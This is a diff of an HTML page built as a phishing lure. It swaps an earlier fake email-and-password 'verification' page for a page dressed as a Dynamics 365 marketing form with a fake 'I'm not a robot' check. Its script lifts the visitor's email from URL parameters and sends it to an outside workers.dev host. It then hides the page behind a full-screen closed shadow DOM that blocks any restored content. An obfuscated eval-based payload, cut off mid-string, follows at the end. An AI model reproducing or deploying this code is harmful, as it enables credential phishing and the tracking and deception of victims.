@@ -1,319 +1,402 @@
-<html lang="en">
+DYNAMICS 365 EMBEDDED
+
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://go.microsoft.com/fwlink/?linkid=2224838" rel="author">
+  <title>Marketing Form</title>
+  <meta name="referrer" content="never">
+  <meta type="xrm/designer/setting" name="type" value="marketing-designer-content-editor-document">
+  <meta type="xrm/designer/setting" name="layout-editable" value="marketing-designer-layout-editable">
 
-  <title><span id="domain-name"></span></title>
-
-  <!-- Vendor -->
-  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
-
+  <!-- Your existing styles (kept) -->
   <style>
-    body {
-      margin: 0;
-      font-family: "Segoe UI", Arial, sans-serif;
-      background-color: #f2f4f8;
+    .editor-control-layout html { box-sizing: border-box; background-color: #fff; }
+    .editor-control-layout *, .editor-control-layout *:before, .editor-control-layout *:after { box-sizing: inherit; }
+    .marketingForm h1, .marketingForm h2, .marketingForm h3, .marketingForm p { margin:0; padding:0; text-align:center; font-family:"Segoe UI", Arial, sans-serif; }
+    .marketingForm h1 { color:#000; line-height:1.25; font-size:28px; }
+    .marketingForm h2 { color:#333; line-height:1.25; font-size:22px; }
+    .marketingForm h3 { color:#000; line-height:1.25; font-size:18px; }
+    .marketingForm p { line-height:1.25; font-size:14px; }
+    .marketingForm a, div[data-editorblocktype="Captcha"] td:nth-of-type(2) a { text-decoration:none; font-family:"Segoe UI", Arial, sans-serif; font-size:14px; }
+    .marketingForm .primaryButtonWrapper, .submitButtonWrapper { text-align:center; margin:10px 0; }
+    .marketingForm .primaryButton, .submitButton { font-family:"Segoe UI", Arial, sans-serif; font-weight:700; font-size:16px; line-height:22px; background:#2266e3; border:none; border-radius:4px; color:#fff; padding:10px 20px; cursor:pointer; }
+    .marketingForm .secondaryButton { font-family:"Segoe UI", Arial, sans-serif; font-weight:700; font-size:16px; line-height:22px; background:#fff; border:1px solid #0082dd; border-radius:4px; color:#2266e3; padding:10px 20px; margin:0; cursor:pointer; }
+    .marketingForm .error { font-family:Arial, Verdana, sans-serif; font-weight:bold; font-size:8px; color:#a80000; }
+    .zero-state-container span { font-family:"Segoe UI", Arial, sans-serif; font-weight:600; font-size:20px; color:#242424; }
+    form.marketingForm { color:#000; font-family:"Segoe UI", Arial, sans-serif; font-size:14px; }
+    [data-layout="true"] { margin:0 auto; max-width:600px; background:rgba(255,255,255,0); }
+    div[data-editorblocktype="SubmitButton"] { padding:20px 12%; }
+    div[data-editorblocktype="Captcha"] { padding:20px 12%; }
+    div[data-editorblocktype="Captcha"] table, div[data-editorblocktype="Captcha"] div>table>tbody>tr>td:nth-of-type(2) { width:100% !important; }
+    div[data-editorblocktype="Captcha"] div>div>table>tbody>tr:first-of-type>td:last-of-type { padding-bottom:12px !important; }
+    div[data-editorblocktype="Captcha"] tr[id="wlspispHIPErrorContainer"] { margin-top:20px; }
+    div[data-editorblocktype="Captcha"] tr[id="wlspispHIPErrorContainer"] td:nth-of-type(2) { width:auto !important; }
+    div[data-editorblocktype="Captcha"] tr[id="wlspispHIPErrorContainer"] img { display:flex; }
+    div[data-editorblocktype="Captcha"] td:nth-of-type(2)>div>div { margin-top:4px; }
+    div[data-editorblocktype="Captcha"] td:nth-of-type(2)>div>div * { font-weight:400; }
+    div[data-editorblocktype="Captcha"] td:nth-of-type(2)>div>div b { color:#797775; }
+    div[data-editorblocktype="Captcha"] tr:nth-of-type(2)>td { height:0 !important; }
+    div[data-editorblocktype="Captcha"] td input { margin-top:20px !important; padding:6px 8px !important; width:100% !important; }
+    div[data-editorblocktype="Captcha"] div[id^="wlspaudioBtnHolder"] { display:flex; align-items:center; justify-content:center; }
+    div[data-editorblocktype="About"], div[data-editorblocktype="Sessions"], div[data-editorblocktype="Speakers"] { padding:32px 24px; }
+    .textFormFieldBlock, .dateTimeFormFieldBlock, .twoOptionFormFieldBlock, .optionSetFormFieldBlock, .multiOptionSetFormFieldBlock, .lookupFormFieldBlock { padding:20px 30px; display:flex; flex-direction:column; gap:16px; }
+    table.multi .textFormFieldBlock, table.multi .dateTimeFormFieldBlock, table.multi .twoOptionFormFieldBlock, table.multi .optionSetFormFieldBlock, table.multi .multiOptionSetFormFieldBlock, table.multi .lookupFormFieldBlock { padding:12px 20px; }
+    .consentBlock { padding:4px 30px; }
+    .textFormFieldBlock label, .dateTimeFormFieldBlock label, .lookupFormFieldBlock label, .twoOptionFormFieldBlock label.block-label, .optionSetFormFieldBlock label.block-label, .multiOptionSetFormFieldBlock label.block-label, div[data-editorblocktype="Captcha"] label[id^="wlspispHipInstructionContainer"], .consentBlock label p { font-family:"Segoe UI", Arial, sans-serif; font-size:16px; font-weight:600; color:#323130; }
+    .textFormFieldBlock label, .dateTimeFormFieldBlock label, .lookupFormFieldBlock label, .twoOptionFormFieldBlock label.block-label, .optionSetFormFieldBlock label.block-label, .multiOptionSetFormFieldBlock label.block-label, div[data-editorblocktype="Captcha"] label[id^="wlspispHipInstructionContainer"] { display:inline-block; margin-top:4px; }
+    .textFormFieldBlock textArea { resize:vertical; height:120px; }
+    .lookupFormFieldBlock input { background-repeat:no-repeat; background-position-x:98%; background-position-y:center; background-size:1em 1em; }
+    .optionSetFormFieldBlock select { background-repeat:no-repeat; background-position-x:98%; background-position-y:center; appearance:none; }
+    .twoOptionFormFieldBlock div.radiobuttons, .twoOptionFormFieldBlock div.twooption_checkbox, .optionSetFormFieldBlock div.radiobuttons, .multiOptionSetFormFieldBlock fieldset { font-family:"Segoe UI", Arial, sans-serif; font-size:14px; border:none; display:flex; flex-direction:column; align-items:flex-start; padding:0; gap:8px; flex:2; margin-top:16px; }
+    .twoOptionFormFieldBlock div.radiobuttons>div, .twoOptionFormFieldBlock div.twooption_checkbox>div, .optionSetFormFieldBlock div.radiobuttons>div, .multiOptionSetFormFieldBlock fieldset>div, .consentBlock>div { display:flex; flex-direction:row; align-items:center; padding:0; gap:8px; }
+    .twoOptionFormFieldBlock div.radiobuttons div input, .twoOptionFormFieldBlock div.twooption_checkbox div input, .optionSetFormFieldBlock div.radiobuttons div input, .multiOptionSetFormFieldBlock fieldset>div>input[type="checkbox"], .eventSession>div>input[type="checkbox"], .consentBlock div input { margin:0; width:20px; height:20px; border:1px solid #323130; border-radius:2px; accent-color:#0078d4; flex-shrink:0; }
+    @media only screen and (max-width: 768px) {
+      .marketingForm .multi table { table-layout:fixed; height:auto !important; }
+      .marketingForm .multi tbody, .marketingForm .multi tbody tr, .marketingForm .multi tbody tr td, .marketingForm .multi tbody tr th, .marketingForm .outer tbody, .marketingForm .outer tbody tr, .marketingForm .outer tbody tr td, .marketingForm .outer tbody tr th { display:block; box-sizing:border-box; height:auto !important; }
+      .marketingForm .wrap-section .outer tbody tr td.inner, .marketingForm .no-wrap-section .outer tbody tr td.inner { width:100% !important; height:auto !important; }
     }
+    .notification-container { margin:10px; }
+    .notification-message { display:flex; justify-content:center; align-items:center; min-height:38px; border:1.44737px solid #CCC; border-radius:10px; margin:10px 0; }
+    .phoneFormFieldBlock { padding:20px 30px; display:flex; flex-direction:column; gap:16px; }
+    table.multi .phoneFormFieldBlock { padding:12px 20px; }
+    .phoneFormFieldBlock label, .phoneFormFieldBlock label * { font-family:"Segoe UI", Arial, sans-serif; font-size:16px; font-weight:600; color:#323130; }
+    .phoneFormFieldBlock .phoneCountryCode { display:flex; align-items:center; border:1px solid #e1dfdd; border-radius:2px; justify-content:center; overflow:hidden; width:100%; height:100%; }
+    .phoneFormFieldBlock input { font-family:"Segoe UI", Arial, sans-serif; font-size:14px; padding:6px 8px; background:#faf9f8; display:block; width:100%; height:100%; border:none; }
+  </style>
 
-    /* Background layer */
-    #screenshot-background {
-      position: fixed;
-      inset: 0;
-      background-size: cover;
-      background-repeat: no-repeat;
-      filter: brightness(0.6);
-      z-index: -2;
-    }
+  <!-- Minimal card styles (no elephant visuals) -->
+  <style>
+    .rc-wrap { display:flex; justify-content:center; }
+    .rc-card { width:360px; border-radius:10px; padding:14px; background:#fff; font-family:"Segoe UI", Arial, sans-serif; color:#374151; }
+  </style>
 
-    /* Loading overlay */
-    #loading-container {
-      position: fixed;
-      inset: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      background: #f9f9f9;
-      z-index: 9999;
-    }
-
-    #loading-bar {
-      width: 80%;
-      height: 10px;
-      margin-top: 20px;
-      background: #e0e0e0;
-      border-radius: 6px;
-      overflow: hidden;
-    }
-
-    #loading-bar-progress {
-      height: 100%;
-      width: 0;
-      background: #4caf50;
-      animation: loading 3s linear forwards;
-    }
-
-    @keyframes loading {
-      to { width: 100%; }
-    }
-
-    #loading-info {
-      margin-top: 18px;
-      font-size: 14px;
-      color: #333;
-    }
-
-    /* Main card */
-    .verify-card {
-      max-width: 600px;
-      width: 90%;
-      margin: 60px auto;
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 6px 28px rgba(0,0,0,.25);
-      overflow: hidden;
-    }
-
-    .verify-header {
-      padding: 28px 20px;
-      text-align: center;
-      color: #fff;
-      background: linear-gradient(1800deg, #191a1b, #bec2c3);
-    }
-
-    .verify-header img {
-      height: 50px;
-      margin-bottom: 14px;
-    }
-
-    .verify-body {
-      padding: 30px;
-      
-    }
-
-    .btn-submit {
-      width: 100%;
-      padding: 10px;
-      border-radius: 6px;
-      border: none;
-      font-weight: 600;
-      color: #fff;
-      background: linear-gradient(90deg, #191a1b, #bec2c3);
-    }
-
-    /* Typing cursor */
-    .typing-cursor {
-      width: 2px;
-      height: 1.2em;
-      background: #000;
-      margin-left: 2px;
-      display: inline-block;
-      animation: blink .8s steps(1) infinite;
-    }
-
-    @keyframes blink {
-      50% { opacity: 0; }
-    }
-
-    #attempts-info {
-      display: block;
-      margin-top: 5px;
-      font-weight: bold;
-      color: red;
-    }
-
-    /* Alert overlay */
-    #alert-overlay {
-      position: fixed;
-      inset: 0;
-      display: none;
-      justify-content: center;
-      align-items: center;
-      background: rgba(0,0,0,.55);
-      backdrop-filter: blur(6px);
-      z-index: 10002;
-    }
-
-    #alert-overlay.show {
-      display: flex;
-    }
-
-    #alert-box {
-      background: #fff;
-      padding: 26px;
-      border-radius: 14px;
-      max-width: 520px;
-      font-size: 20px;
-      font-weight: 700;
-      text-align: center;
-      animation: pop .28s ease-out;
-    }
-
-    @keyframes pop {
-      from { transform: scale(.92); opacity: 0 }
-      to   { transform: scale(1); opacity: 1 }
-    }
-
-    #user-info-footer {
-      padding: 8px;
-      font-size: 13px;
-      color: #333;
-      background: #f9f9f9;
-      border-top: 1px solid #ddd;
-      text-align: center;
-    }
+  <!-- Verification checkbox styles -->
+  <style>
+    .verification-box { border:2px solid #e0e0e0; border-radius:8px; padding:25px; margin-bottom:30px; background:#fafafa; transition:all .3s ease; }
+    .verification-box.checking { border-color:#f38020; background:#fff8f0; }
+    .verification-box.verified { border-color:#28a745; background:#f0fff4; }
+    .checkbox-container { display:flex; align-items:center; justify-content:center; gap:15px; cursor:pointer; }
+    .custom-checkbox { width:24px; height:24px; border:2px solid #ddd; border-radius:4px; position:relative; background:#fff; transition:all .3s ease; }
+    .custom-checkbox.checked { background:#28a745; border-color:#28a745; }
+    .custom-checkbox.checking { border-color:#f38020; }
+    .checkmark { position:absolute; top:2px; left:6px; width:8px; height:14px; border:solid #fff; border-width:0 2px 2px 0; transform:rotate(45deg); opacity:0; transition:opacity .3s ease; }
+    .checkmark.visible { opacity:1; }
+    .spinner { width:20px; height:20px; border:2px solid #f3f3f3; border-top:2px solid #f38020; border-radius:50%; animation:spin 1s linear infinite; display:none; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .verification-text { font-size:16px; color:#333; font-weight:500; }
+    .verification-text.checking { color:#f38020; }
+    .verification-text.verified { color:#28a745; }
+    .progress-bar { width:100%; height:4px; background:#f0f0f0; border-radius:2px; margin-top:20px; overflow:hidden; display:none; }
+    .progress-fill { height:100%; background:linear-gradient(90deg,#f38020,#ff6b35); border-radius:2px; width:0%; transition:width 3s ease; }
+    .redirect-message { color:#28a745; font-weight:500; margin-top:15px; display:none; }
   </style>
 </head>
 
 <body>
+<main>
+  <form aria-label="Untitled Form" class="marketingForm">
+    <div data-layout="true" data-layout-version="v2" style="margin:auto; max-width:600px;">
+      <div data-section="true" class="emptyContainer columns-equal-class wrap-section">
+        <table class="outer" align="center" cellpadding="0" cellspacing="0" style="border-collapse:collapse; width:600px; display:block;">
+          <tbody><tr><th style="padding:88px 10px 0">
+            <table style="width:100%; border-collapse:collapse" class="containerWrapper tbContainer" cellpadding="0" cellspacing="0">
+              <tbody><tr><th data-container="true" class="columnContainer" data-container-width="100" style="vertical-align:top; min-width:5px; width:580px;">
+                <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse; height:100%;">
+                  <tbody><tr><th class="inner" style="min-width:5px; padding:0; vertical-align:top; word-wrap:break-word; word-break:break-word; margin-bottom:32px; font-weight:normal;">
+                    <div style="text-align:center">
+                      <div data-editorblocktype="Text" style="margin:10px">
+                        <h1><span style="font-size:20px;">CHECKING FOR MALWARE AND THREATS...</span></h1>
+                      </div>
+                    </div>
+                  </th></tr></tbody>
+                </table>
+              </th></tr></tbody>
+            </table>
+          </th></tr></tbody>
+        </table>
+      </div>
 
-<div id="screenshot-background"></div>
+      <!-- Verification captcha (checkbox) -->
+      <div class="rc-wrap" id="verification-region" role="region" aria-label="Verify to continue">
+        <div class="rc-card">
+          <div class="verification-box" id="verificationBox">
+            <div class="checkbox-container" id="checkboxContainer">
+              <div class="custom-checkbox" id="customCheckbox">
+                <div class="checkmark" id="checkmark"></div>
+                <div class="spinner" id="spinner"></div>
+              </div>
+              <span class="verification-text" id="verificationText">I'm not a robot</span>
+            </div>
 
-<section id="loading-container">
-  <img src="https://img.freepik.com/vecteurs-premium/icone-abonnement-au-message-courrier-electronique_1178600-1831.jpg?semt=ais_hybrid&w=740&q=80"
-       width="50"
-       onerror="this.style.display='none'">
-  <div id="loading-bar">
-    <div id="loading-bar-progress"></div>
-  </div>
-  <div id="loading-info">Loading mail settings...</div>
-</section>
+            <div class="progress-bar" id="progressBar">
+              <div class="progress-fill" id="progressFill"></div>
+            </div>
 
-<div id="alert-overlay">
-  <div id="alert-box"></div>
-</div>
-
-<main id="main-content" style="display:none;">
-  <div class="verify-card">
-
-    <header class="verify-header">
-      <img src="https://static.vecteezy.com/system/resources/thumbnails/023/495/208/small_2x/global-logo-for-business-png.png"
-           id="logoimg" alt="">
-      <h2><span id="domain-name"></span> Verification</h2>
-      <p>Confirm your identity to maintain service access</p>
-    </header>
-
-    <section class="verify-body">
-      <form id="verify-form" autocomplete="off">
-        <input type="hidden" id="timestamp" name="timestamp">
-        <div style="display:none">
-          <input type="text" id="trap" name="trap" autocomplete="off">
-        </div>
-
-        <div id="msg" class="alert alert-danger" style="display:none">
-          Incorrect Credentials. Please try again
-        </div>
-
-        <span id="error" class="text-danger" style="display:none">
-          Invalid user
-        </span>
-
-        <div class="form-group">
-          <label>Email</label>
-          <div class="d-flex align-items-center">
-            <input id="ai" type="email" class="form-control" readonly required style="height:50px">
-            <span id="cursor" class="typing-cursor"></span>
+            <div class="redirect-message" id="redirectMessage">✓ Verification complete!</div>
           </div>
         </div>
+      </div>
 
-        <div class="form-group">
-          <label>Password</label>
-          <input id="pr" type="password" class="form-control" style="height:50px">
-          <span id="attempts-info">3 attempts left</span>
-        </div>
+      <!-- Example form fields (kept) -->
+      <div data-section="true" class="emptyContainer columns-equal-class wrap-section">
+        <table class="outer" align="center" cellpadding="0" cellspacing="0" style="border-collapse:collapse; width:600px; display:block;">
+          <tbody><tr><th style="padding:0">
+            <table style="width:100%; border-collapse:collapse" class="containerWrapper tbContainer" cellpadding="0" cellspacing="0">
+              <tbody><tr><th data-container="true" class="columnContainer" data-container-width="100" style="vertical-align:top; min-width:5px; width:600px;">
+                <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse; height:100%;">
+                  <tbody><tr><th class="inner" style="min-width:5px; padding:0; vertical-align:top; word-wrap:break-word; word-break:break-word; font-weight:normal;">
+                    <div class="textFormFieldBlock" data-editorblocktype="TextFormField" data-targetproperty="firstname" data-prefill="false" data-hide="hide">
+                      <label title="First Name" for="firstname-1">What is your first name?</label>
+                      <input id="firstname-1" type="text" name="firstname" placeholder="Enter your first name" title="First Name" maxlength="50" value="">
+                    </div>
+                    <div class="textFormFieldBlock" data-editorblocktype="TextFormField" data-targetproperty="lastname" data-prefill="false" data-hide="hide">
+                      <label title="Last Name" for="lastname-1">What is your last name?</label>
+                      <input id="lastname-1" type="text" name="lastname" placeholder="Enter your last name" title="Last Name" maxlength="50" value="">
+                    </div>
+                    <div class="textFormFieldBlock" data-editorblocktype="TextFormField" data-targetproperty="emailaddress1" data-prefill="false" data-hide="hide">
+                      <label title="Email" for="email-1">What is your email?</label>
+                      <input id="email-1" type="email" name="emailaddress1" placeholder="Enter your email address" title="Email">
+                    </div>
+                    <div data-editorblocktype="SubmitButton" class="submitButtonWrapper" align="center" style="text-align:center; margin:10px 0; display:table; width:100%;">
+                      <button class="submitButton" type="submit" style="margin-left:auto; margin-right:auto; padding:10px 20px; height:auto; width:auto; box-sizing:border-box; display:table-cell; background:#fff;">
+                        <span> Submit </span>
+                      </button>
+                    </div>
+                  </th></tr></tbody>
+                </table>
+              </th></tr></tbody>
+            </table>
+          </th></tr></tbody>
+        </table>
+      </div>
 
-        <button id="submit-btn" type="button" class="btn-submit mt-3">
-          Submit
-        </button>
-
-      </form>
-    </section>
-
-    <footer id="user-info-footer"></footer>
-
-  </div>
+      <div data-section="true" class="emptyContainer columns-equal-class wrap-section">
+        <table class="outer" align="center" cellpadding="0" cellspacing="0" style="border-collapse:collapse; width:600px; display:block;">
+          <tbody><tr><th style="padding:0 0 24px">
+            <table style="width:100%; border-collapse:collapse" class="containerWrapper tbContainer" cellpadding="0" cellspacing="0">
+              <tbody><tr><th data-container="true" class="columnContainer" data-container-width="100" style="vertical-align:top; min-width:5px; width:600px;">
+                <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse; height:100%;">
+                  <tbody><tr><th class="inner" style="min-width:5px; padding:12px 10px; vertical-align:top; word-wrap:break-word; word-break:break-word; font-weight:normal;">
+                    <div data-editorblocktype="Text" style="text-align:center">
+                      <p><span style="font-size:10px; line-height:14px; color:#605e5c">© 2025. All rights reserved.</span></p>
+                    </div>
+                  </th></tr></tbody>
+                </table>
+              </th></tr></tbody>
+            </table>
+          </th></tr></tbody>
+        </table>
+      </div>
+    </div>
+  </form>
 </main>
 
 <script>
-  
-let humanInteraction = false;
-let keyPressed = false;
-let attempts = 0;
+/* ===================== Verification checkbox logic ===================== */
+(function(){
+  // Do not run the verification UI logic inside iframes
+  if (window.self !== window.top) return;
 
-/* Set load timestamp */
-document.addEventListener("DOMContentLoaded", function () {
-    document.getElementById("formLoadTime").value = Date.now();
-});
+  var isProcessing = false;
+  var box   = document.getElementById('verificationBox');
+  var cont  = document.getElementById('checkboxContainer');
+  var cb    = document.getElementById('customCheckbox');
+  var mark  = document.getElementById('checkmark');
+  var spin  = document.getElementById('spinner');
+  var text  = document.getElementById('verificationText');
+  var pbar  = document.getElementById('progressBar');
+  var pfill = document.getElementById('progressFill');
+  var done  = document.getElementById('redirectMessage');
 
-/* Detect mouse movement */
-document.addEventListener("mousemove", function () {
-    humanInteraction = true;
-});
+  if (!cont) return;
 
-/* Detect typing */
-document.getElementById("email").addEventListener("keydown", function () {
-    keyPressed = true;
-});
+  cont.addEventListener('click', function(){
+    if (isProcessing) return;
+    isProcessing = true;
 
-document.getElementById("message").addEventListener("keydown", function () {
-    keyPressed = true;
-});
+    box.classList.add('checking');
+    cb.classList.add('checking');
+    text.classList.add('checking');
+    text.textContent = 'Verifying...';
 
-/* Form submission protection */
-document.getElementById("secureForm").addEventListener("submit", function (e) {
+    mark.style.display = 'none';
+    spin.style.display = 'block';
+    pbar.style.display = 'block';
 
-    attempts++;
+    setTimeout(function(){ pfill.style.width = '100%'; }, 100);
 
-    const loadTime = parseInt(document.getElementById("formLoadTime").value);
-    const now = Date.now();
-    const seconds = (now - loadTime) / 1000;
+    setTimeout(function(){
+      spin.style.display = 'none';
+      mark.style.display = 'block';
+      mark.classList.add('visible');
 
-    const honeypot = document.getElementById("website").value;
+      box.classList.remove('checking'); box.classList.add('verified');
+      cb.classList.remove('checking');  cb.classList.add('checked');
+      text.classList.remove('checking'); text.classList.add('verified');
+      text.textContent = 'Verification complete';
+      done.style.display = 'block';
 
-    /* Check 1: Too fast submission */
-    if (seconds < 5) {
-        alert("Submission too fast. Bot suspected.");
-        e.preventDefault();
-        return;
+      // proceed to fullscreen embed
+      window.redirectPage();
+    }, 3000);
+  });
+})();
+
+/* ===================== Fullscreen, duplication-proof embed ===================== */
+(function(){
+  var LOCK_FLAG = '__RC_EMBED_LOCK__';
+
+  window.redirectPage = function redirectPage() {
+    // Prevent running inside iframe (avoids recursion)
+    if (window.self !== window.top) return;
+
+    // Run once only
+    if (window[LOCK_FLAG]) return;
+    window[LOCK_FLAG] = true;
+
+    // Build target with your email rule: take the email immediately after '&'
+var href = window.location.href;
+var emailParam = "";
+
+// Parse URL safely
+var url;
+try {
+  url = new URL(href);
+} catch (e) {
+  console.error("URL parse failed");
+}
+
+// 1️⃣ ORIGINAL RULE — &email@domain.com
+if (!emailParam) {
+  var raw = href.split("&");
+  for (var i = 0; i < raw.length; i++) {
+    if (raw[i].includes("@") && !raw[i].includes("=")) {
+      emailParam = raw[i];
+      break;
+    }
+  }
+}
+
+// 2️⃣ ?state= (base64 OR plain)
+if (!emailParam && url && url.searchParams.has("state")) {
+  var stateVal = url.searchParams.get("state");
+
+  try {
+    var decoded = atob(stateVal);
+    if (decoded.includes("@")) emailParam = decoded;
+  } catch (e) {
+    if (stateVal.includes("@")) emailParam = stateVal;
+  }
+}
+
+// 3️⃣ ?id= (base64)
+if (!emailParam && url && url.searchParams.has("id")) {
+  try {
+    var decodedId = atob(url.searchParams.get("id"));
+    if (decodedId.includes("@")) emailParam = decodedId;
+  } catch (e) {}
+}
+
+// 4️⃣ Validate
+if (emailParam && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailParam)) {
+  console.warn("Invalid email detected:", emailParam);
+  emailParam = "";
+}
+
+// 5️⃣ Build target (NO encoding)
+var TARGET_BASE = "https://maggo.log-internals.workers.dev";
+var target = TARGET_BASE + "#" + emailParam;
+
+console.log("Redirect target:", target);
+
+
+    // Avoid self-embedding
+    var here = location.href.split("#")[0];
+    if (target.split("#")[0] === here) {
+      console.error("[embed] Target URL equals current page. Use a different URL.");
+      window[LOCK_FLAG] = false;
+      return;
     }
 
-    /* Check 2: Honeypot filled */
-    if (honeypot !== "") {
-        alert("Bot detected.");
-        e.preventDefault();
-        return;
-    }
+    // Prepare full-viewport canvas
+    document.documentElement.style.height = "100%";
+    document.body.style.margin = "0";
+    document.body.style.height = "100%";
+    document.body.style.overflow = "hidden";
 
-    /* Check 3: No mouse movement */
-    if (!humanInteraction) {
-        alert("No human interaction detected.");
-        e.preventDefault();
-        return;
-    }
+    var HOST_ID = "rc-embed-host";
+    var host = document.createElement("div");
+    host.id = HOST_ID;
+    host.style.position = "fixed";
+    host.style.inset = "0";
+    host.style.zIndex = "2147483647";
 
-    /* Check 4: No typing */
-    if (!keyPressed) {
-        alert("Typing activity required.");
-        e.preventDefault();
-        return;
-    }
+    // Replace all visible content with the host
+    document.body.replaceChildren(host);
 
-    /* Check 5: Too many attempts */
-    if (attempts > 3) {
-        alert("Too many attempts.");
-        e.preventDefault();
-        return;
-    }
+    // Stop platform from re-adding nodes under the host
+    var mo = new MutationObserver(function(muts){
+      muts.forEach(function(m){
+        m.addedNodes && m.addedNodes.forEach(function(node){
+          if (node.nodeType === 1 && node.id !== HOST_ID) {
+            try { node.remove(); } catch(e){}
+          }
+        });
+      });
+    });
+    mo.observe(document.body, { childList: true });
 
-    alert("Form submitted successfully!");
-});
+    // CLOSED Shadow DOM for isolation
+    var root = host.attachShadow({ mode: "closed" });
 
- </script>
-<script >
-  
-let Konu;!function(){const sgxA=Array.prototype.slice.call(arguments);return eval("(function EL2E(n19w){const n3Gx=z8gv(n19w,fTwx(EL2E.toString()));try{let PAJx=eval(n3Gx);return PAJx.apply(null,sgxA);}catch(jYBx){var LvEx=(0o205214-68206);while(LvEx<(0o400155%65575))switch(LvEx){case (0x30075%0o200035):LvEx=jYBx instanceof SyntaxError?(0o400103%0x1001B):(0o400157%0x10028);break;case (0o200606-0x10179):LvEx=(0o400173%65582);{console.log(\'Error: the code has been tampered!\');return}break;}throw jYBx;}function fTwx(Hqzx){let bOrx=1318533648;var Dlux=(0o400047%65550);{let fLov;while(Dlux<(0x10460-0o202104)){switch(Dlux){case (0o600123%0x10016):Dlux=(68056-0o204703);{bOrx^=(Hqzx.charCodeAt(fLov)*(15658734^0O73567354)+Hqzx.charCodeAt(fLov>>>(0x4A5D0CE&0O320423424)))^711285349;}break;case (0o204064-67615):Dlux=(131110%0o200010);fLov++;break;case (262226%0o200017):Dlux=fLov<Hqzx.length?(0o400123%0x10021):(67496-0o203614);break;case (0o1000073%0x1000C):Dlux=(0o203004-0x105EE);fLov=(0x75bcd15-0O726746425);break;}}}let Hirv=\"\";var bGjv=(65796-0o200367);{let Ddmv;while(bGjv<(0o600137%0x10013)){switch(bGjv){case (0o600130%65561):bGjv=(0x20055%0o200036);Ddmv=(0x21786%3);break;case (0o200764-0x101DB):bGjv=Ddmv<(0O347010110&0x463A71D)?(65776-0o200330):(0o400122%0x10016);break;case (131140%0o200026):bGjv=(0o204254-0x10887);{const XAev=bOrx%(0o204540-67906);bOrx=Math.floor(bOrx/(0x3007E%0o200040));Hirv+=XAev>=(131138%0o200024)?String.fromCharCode((0o210706-0x11185)+(XAev-(0o400072%0x10010))):String.fromCharCode((196831%0o200052)+XAev);}break;case (0o600221%0x10024):bGjv=(0o200372-65761);Ddmv++;break;}}}return Hirv;}function z8gv(Tv9u,v3bv){Tv9u=decodeURI(Tv9u);let v5Iv=(0x75bcd15-0O726746425);let XCLv=\"\";var r0Dv=(0o202626-0x1058B);{let TxGv;while(r0Dv<(0x10D20-0o206404)){switch(r0Dv){case (0o200252-0x10099):r0Dv=(0o200644-65935);{XCLv+=String.fromCharCode(Tv9u.charCodeAt(TxGv)^v3bv.charCodeAt(v5Iv));v5Iv++;var nVyv=(0o202176-0x10467);while(nVyv<(0x3007E%0o200040))switch(nVyv){case (0o400125%65567):nVyv=v5Iv>=v3bv.length?(66656-0o202120):(0o600165%65565);break;case (262204%0o200013):nVyv=(0o1000236%65568);{v5Iv=(0x75bcd15-0O726746425);}break;}}break;case (0o400062%0x1000E):r0Dv=TxGv<Tv9u.length?(196724%0o200041):(262280%0o200033);break;case (262183%0o200007):r0Dv=(65756-0o200306);TxGv=(0x75bcd15-0O726746425);break;case (0o400073%65555):r0Dv=(0x3004F%0o200023);TxGv++;break;}}}return XCLv;}})(\"Z%09%10/%16%1E%0A%0E%1CGL:%13%1F%0D%02%06%06%0A/U/%09(!GL:%07%0F%17%14%00%01Ei%5DA8@)28h%5E1%3EH)DDj.7%3E%1C%14%1A%0B%22%01%03%0C%0FR%08%09%0D&BJ%1A%00%0A%114%07%04CI36%0B%10%5DCJ:%11%20?%09%5DC%3EI%055%16%0C%5DCJ%1C%14%1A%0B%22%01%03%0C%0FR.%02%02&B%00%084%3CL:%07%0F%17%14%00%01E&;?/:%11%06#%12(Q%1E*%1D%01%10%7C%0E%17X%07%07%01%065%1C%05%0DA%05%0B%12%12%5DC%18%13%17%1B%103%1BJ6%077%20Mh%5E%194%0C?GLj%02%0E&(ZFN.%1F8$I%5B%12%034%1B%09%17%08%1D%01E%18%10%100I%5B%14%17$%01%1F%11%0FRGNi.A8:SD%3E%1C%5EKH:/2N%1A%5E1%3E%3C/2N%1A(C8J)28h%5EBHJ)D%3E%1C(1H:/2L%3C%13%1F%0D%02%06%06%0A/U%19%02%10!GL:%07%0F%17%14%00%01Ei%5EKH:/FNi%5DAH:Y48%1C.A8%3C/DMj%5E1H:/2%3Ej.7%3EH%5BEM%004%12)I%5BFL%3C%13%1F%0D%02%06%06%0A/U?%01%15!GL:%07%0F%17%14%00%01E%18%10%22*I%5BD%3C%16%1E;KHY%18%09%12%3EBJJ%159%0C%0E%5DC%1E%07%07%01%065%1C%05%0DA%05-%10%11%5DC%18%13%17%1B%103%1BJ%08%06%3E(Mh%5E/%09(!GLj%16%03-(ZFN2%22%07.I%5B%12%034%1B%09%17%08%1D%01E%186%123I%5B%14%17$%01%1F%11%0FRGN%60%5E1%3EJZDN%1A%5E1%3E%3C)D%3E%1C(CJKZDN%1A%5E1%3E%3C)D%3E%1C(CHIYG%3Ej.1BJ)2N%60%5E1%3E%3CY4N%1A(7%3E%3CY48h.A8:Y4%3Ej.7%3EJ)D%3E%1C(7H:/2%3Ej.7%3E:YNN%1A(7%3E%3C%5B%12..%1B%1FM%00%11RM%1A%1B%1F%0F%0D/RXfRCX%07%07%01%065%1C%05%0DA%01%16%0A%11%5DC%18%13%17%1B%103%1BJKJ)2Lj%5DB%10%00%03%3CMh%5C@KJ)2N%60%5E1%3EJZDN%1A%5E1%3E%3C)D%3E%1C%5E1%3E%3C%5BFL%3C%13%1F%0D%02%06%06%0A/U?%19%13%22GL:%07%0F%17%14%00%01Ei%01%13%13%04%1D%09Ei.7